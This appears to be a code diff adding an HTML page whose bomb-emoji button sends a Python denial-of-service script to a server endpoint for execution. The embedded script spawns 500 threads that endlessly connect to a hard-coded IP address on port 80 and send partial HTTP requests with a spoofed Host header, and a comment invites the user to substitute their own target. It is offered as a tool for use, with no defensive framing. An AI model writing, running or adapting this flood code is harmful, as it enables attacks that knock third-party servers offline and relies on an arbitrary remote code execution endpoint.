@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Python Code Execution</title>
+    <style>
+        .button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Python Code Execution</h1>
+    <button class="button" onclick="executePythonCode()">💣</button>
+
+    <script>
+        function executePythonCode() {
+            // Replace the target IP address and fake IP address with your desired values
+            const target = '104.16.10.112';
+            const fake_ip = '182.21.20.32';
+            const port = 80;
+
+            // Python code to execute
+            const pythonCode = `
+import socket
+import threading
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\\r\\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\\r\\n\\r\\n").encode('ascii'), (target, port))
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+`;
+
+            // Send the Python code to the server for execution
+            fetch('/execute-python-code', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ code: pythonCode })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+    </script>
+</body>
+</html>
